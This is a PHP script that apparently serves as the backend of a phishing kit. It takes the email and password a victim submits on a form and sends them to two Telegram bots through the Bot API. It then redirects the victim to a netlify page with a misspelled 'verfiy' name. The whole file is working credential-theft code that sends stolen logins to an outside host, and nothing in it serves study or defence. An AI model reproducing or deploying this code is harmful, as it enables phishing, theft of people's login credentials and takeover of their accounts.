
<?php
$datum = date('d-m-Y / H:i:s');

include 'Frank420jsxxnxxxsjmsksksjsjsjsjsksksks-sksk.snsnssjsjdhsiafran.php';
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$send = $email; 
$send = $email2; 
$message = "THANKS Salary\n";
$message .= "email : ".$_POST['email']."\r\n";
$message .= "password : ".$_POST['password']."\r\n";

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
file_get_contents("https://api.telegram.org/bot".$api2."/sendMessage?chat_id=".$chatid2."&text=" . urlencode($message)."" );



HEADER("Location: https://privacynorthlane.netlify.app/verfiy.CruiseShipID");


?>
